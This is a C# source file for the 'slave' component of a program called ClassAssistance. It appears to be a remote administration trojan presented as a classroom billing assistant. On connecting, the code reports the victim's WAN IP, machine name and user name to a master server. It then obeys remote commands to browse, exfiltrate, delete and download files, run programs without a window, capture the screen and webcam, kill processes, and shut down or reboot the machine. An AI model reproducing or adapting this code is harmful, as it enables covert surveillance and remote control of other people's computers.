using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using ClassAssistance.Common;
using ClassAssistance.Common.Network.Protocol;
using ClassAssistance.Slave.Helper;
using ClassAssistance.Slave.Helper.Native.Impl;
using ClassAssistance.Slave.Malicious;
using NetMQ;
using NetMQ.Sockets;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Threading;

namespace ClassAssistance.Slave
{
/// <summary>
/// 
/// </summary>
    public sealed class MasterServer : Singleton<MasterServer>
    {
        private const int DISCONNECTION_TIMEOUT = 8000;
        private const int SEND_INTERVAL = 10;
        
        private readonly Stopwatch m_receiveTimer;
        private readonly NetMQSocket m_client;
        private readonly NetMQPoller m_poller;
        private readonly ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
        private string m_serverAddress;
        private bool m_connected;
        private long m_lastReceived = -1;
        private CancellationTokenSource tokenSource = new CancellationTokenSource();
        private Task a;

        /// <summary>
        /// 
        /// </summary>
        public MasterServer()
        {
            m_client = new DealerSocket();
            m_client.Options.Linger = TimeSpan.Zero;
            m_client.ReceiveReady += ClientReceive;

            m_receiveTimer = Stopwatch.StartNew();

            var sendTimer = new NetMQTimer(SEND_INTERVAL);
            sendTimer.Elapsed += SendQueue;

            m_poller = new NetMQPoller { sendTimer, m_client };
            //m_poller.PollTimeout = 10;
        }

        /// <summary>
        /// 
        /// </summary>
        public void Connect(string serverAddress) 
        {
            m_serverAddress = serverAddress;
            m_poller.RunAsync();
            m_client.Connect(m_serverAddress);

            SendGreet();
        }

        /// <summary>
        /// 
        /// </summary>
        private void SendGreet()
        {
            Send(new GreetTheMasterMessage
            {
                Ip = Utility.GetWanIp(),
                MachineName = WindowsHelper.MachineName,
                UserName = WindowsHelper.UserName,
                OperatingSystem = PlatformHelper.FullName
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendQueue(object sender, NetMQTimerEventArgs e)
        {
            var i = m_sendQueue.Count;
            while (i > 0)
            {
                NetMQMessage message;
                if (m_sendQueue.TryDequeue(out message))
                    m_client.TrySendMultipartMessage(message);
                i--;
            }

            if (m_connected && (m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT))
            {
                SetDisconnected();
                SendGreet();
            }
        }
                
        /// <summary>
        /// 
        /// </summary>
        private void SetConnected() => m_connected = true;

        /// <summary>
        /// 
        /// </summary>
        private void SetDisconnected()
        {
            m_connected = false;
            ScreenCapture.Instance.StopScreenCapture();
            ClearSendQueue();
        }

        /// <summary>
        /// 
        /// </summary>
        private void ClearSendQueue()
        {
            NetMQMessage msg;
            while (m_sendQueue.Count > 0)
                m_sendQueue.TryDequeue(out msg);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_sendQueue.Enqueue(new NetMQMessage(new[] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        private void UpdateLastReceived() => m_lastReceived = m_receiveTimer.ElapsedMilliseconds;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClientReceive(object sender, NetMQSocketEventArgs e)
        {
            UpdateLastReceived();
            SetConnected();

            var frames = m_client.ReceiveMultipartMessage();
            var message = NetMessage.Deserialize(frames[0].Buffer);
            message.Match()
                .With<DoYourDutyMessage>(DoYourDuty)
                .With<PingMessage>(m => Send(new PongMessage()))
                .With<NavigateToFolderMessage>(NavigateToFolder)
                .With<DownloadFilePartMessage>(DownloadFilePart)
                .With<UploadFileMessage>(UploadFile)
                .With<DeleteFileMessage>(DeleteFile)
                .With<StartScreenCaptureMessage>(ScreenCapture.Instance.StartScreenCapture)
                .With<StopScreenCaptureMessage>(ScreenCapture.Instance.StopScreenCapture)
                .With<ExecuteFileMessage>(ExecuteFile)
                .With<StartWebcamCaptureMessage>(Webcam.Instance.StartScreenCapture)
                .With<StopWebcamCaptureMessage>(Webcam.Instance.StopScreenCapture)
                .With<StartTasksMessage>(TaskList)
                .With<StopTasksMessage>(StopTaskList)
                .With<KillProcessMessage>(KillProcess)
                .With<ShutdownRemoteMessage>(Shutdown)
                .With<RebootRemoteMessage>(Reboot)
                .With<LoginSuccessMessage>(LoginSuccess)
                .With<LoginFailMessage>(LoginFail)
                .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));

    #if DEBUG
            if(message.GetType() != typeof(PingMessage))
                Console.WriteLine(message.GetType().Name);
    #endif
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="windowId"></param>
        /// <param name="exception"></param>
        public void SendStatus(int windowId, long operationId, string operation, Exception exception) => 
            SendStatus(windowId, operationId, operation, false, "Failed : " +  exception);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        /// <param name="windowId"></param>
        public void SendStatus(int windowId, long operationId, string operation, string message) => 
            SendStatus(windowId, operationId, operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        public void SendStatus(int windowId, string operation, string message) => 
            SendStatus(windowId, -1, operation, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        public void SendFailedStatus(int windowId, string operation, string message) => 
            SendStatus(windowId, -1, operation, false, "Failed : " + message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        /// <param name="windowId"></param>
        public void SendStatus(int windowId, long operationId, string operation, bool success, string message)
        {
            Send(new StatusUpdateMessage
            {
                WindowId = windowId,
                OperationId = operationId,
                Operation = operation,
                Success = success,
                Message = message
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDutyMessage message)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowId"></param>
        /// <param name="operationId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="sucessMessage"></param>
        public void ExecuteSimpleOperation(int windowId, long operationId, string operationName,
            Action operation, string sucessMessage)
        {
            Utility.ExecuteComplexOperation(() =>
                {
                    operation();
                    return true;
                },
                result => SendStatus(windowId, operationId, operationName, "Success : " + sucessMessage),
                error  => SendStatus(windowId, operationId, operationName, error)
            );
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="windowId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="messageBuilder"></param>
        public void ExecuteSimpleOperation<T>(int windowId, string operationName,
            Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
        {
            ExecuteComplexSendOperation(windowId, operationName, operation, message =>
                SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message)));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="windowId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        public void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
            => ExecuteComplexSendOperation(windowId, operationName, operation, x => { });

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="windowId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        public void ExecuteComplexSendOperation<T>(int windowId, string operationName, 
            Func<T> operation, Action<T> success) where T : NetMessage
            => ExecuteComplexSendOperation(windowId, -1, operationName, operation, success);

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="windowId"></param>
        public void ExecuteComplexSendOperation<T>(int windowId, long operationId, string operationName,
            Func<T> operation, Action<T> success) where T : NetMessage
        {
            Utility.ExecuteComplexOperation(operation, message =>
            {
                Send(message);
                success(message);
            }, 
            e => SendStatus(windowId, operationId, operationName, e));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void NavigateToFolder(NavigateToFolderMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, "Folder navigation", 
                () => FileHelper.NavigateToFolder(message.Path, message.Drives), 
                nav => $"{nav.Path}");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DownloadFilePart(DownloadFilePartMessage message)
        {
            ExecuteComplexSendOperation(message.WindowId, message.Id, "File download",
                () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                part =>
                {
                    if (part.CurrentPart == part.TotalPart)
                        SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded: " + part.Path);
                }
                
                );
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void UploadFile(UploadFileMessage message)
        {
            try
            {
                var client = new WebClient();
                client.DownloadProgressChanged += (s, e) =>
                {
                    // avoid spam by sending only 5 by 5%
                    if (e.ProgressPercentage % 5 == 0)
                    {
                        Send(new UploadProgressMessage
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = e.ProgressPercentage,
                            Uri = message.Uri
                        });
                    }
                };

                client.DownloadFileCompleted += (s, e) =>
                {
                    if (e.Error != null)
                    {
                        SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e.Error);
                    }
                    else
                    {
                        // -1 mean finished
                        Send(new UploadProgressMessage
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = -1,
                            Uri = message.Uri
                        });
                    }
                    client.Dispose();
                };
                client.DownloadFileAsync(new Uri(message.Uri), message.Path);                
            }
            catch(Exception e)
            {
                SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DeleteFile(DeleteFileMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, "File deletion",
                () => FileHelper.DeleteFile(message.FilePath),
                deletion => $"{deletion.FilePath}");
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void ExecuteFile(ExecuteFileMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, -1, "File execution",
            () =>
            {
                var si = new Kernel32.STARTUPINFO();
                var pi = new Kernel32.PROCESS_INFORMATION();
                var sap = new Kernel32.SECURITY_ATTRIBUTES();
                var sat = new Kernel32.SECURITY_ATTRIBUTES();
                const uint CreateNoWindow = 0x08000000;

                var directory = Path.GetDirectoryName(message.FilePath);
                Kernel32.CreateProcess(message.FilePath, "", ref sap, ref sat, false, 
                    CreateNoWindow, IntPtr.Zero, directory, ref si, out pi);

            }, message.FilePath);
        }

        

        private void DoWork(StartTasksMessage message, CancellationToken token)
        {
            Dictionary<string, List<PerformanceCounter>> taskInfo = new Dictionary<string, List<PerformanceCounter>>();

            while (true)
            {
                    
                if (token.IsCancellationRequested == true)
                {
                    break;
                }
                    

                var tasksMessage = new TasksMessage(TaskManager.GetTasksList(taskInfo));
                ExecuteComplexSendOperation(message.WindowId,
                "Task Manager",
                () => tasksMessage);
                

                    if (token.IsCancellationRequested)
                    {
                    break;
                    }
                     
            }
            
        }

        public void TaskList(StartTasksMessage message)
        {
            var token = tokenSource.Token;
            a = Task.Factory.StartNew(() => DoWork(message, token), token);
           
        }

        public void StopTaskList(StopTasksMessage message)
        {
            
            tokenSource.Cancel();
            //Console.WriteLine("After " + a.Status);
            // Just continue on this thread, or Wait/WaitAll with try-catch:
    
        }

        public void KillProcess(KillProcessMessage message)
        {
            Process p = Process.GetProcessById(Convert.ToInt32(message.PID));
            p.Kill();
        }

        public void Shutdown(ShutdownRemoteMessage message)
        {
            string param = "/s /t " + message.DelayTime;
            var psi = new ProcessStartInfo("shutdown", param);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        public void Reboot(RebootRemoteMessage message)
        {
            string param = "/r /t " + message.DelayTime;
            var psi = new ProcessStartInfo("shutdown", param);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private void LoginSuccess(LoginSuccessMessage message)
        {
            LoginProtect.TimeStop();
            
            System.Windows.Application.Current.Dispatcher.BeginInvoke(
                new Action(
                    delegate
                    {
                        App.Current.MainWindow.Hide();
                        MainWindow.ni.BalloonTipTitle = "ClassAssistance";
                        MainWindow.ni.BalloonTipText = "已将ClassAssistance最小化到托盘,程序将在后台运行";
                        MainWindow.ni.BalloonTipIcon = ToolTipIcon.Info;
                        MainWindow.ni.ShowBalloonTip(30000);
                        MainWindow.startTime = DateTime.Now.Ticks;
                        MainWindow.price = message.Price;
                    }
                    )
                );
        }

        private void LoginFail(LoginFailMessage message)
        {
            MessageBox.Show("Student ID or Password incorrect!");
        }

        public void RequestLogin(string stuid, string password)
        {
            Send(new LoginMessage
            {
                stuid = stuid,
                password = password
            });
        }

        private void CancelLoginProtect()
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="reason"></param>
        public void FireShutdown(int reason) => Send(new ShutdownMessage{ Reason = reason });
    }
}
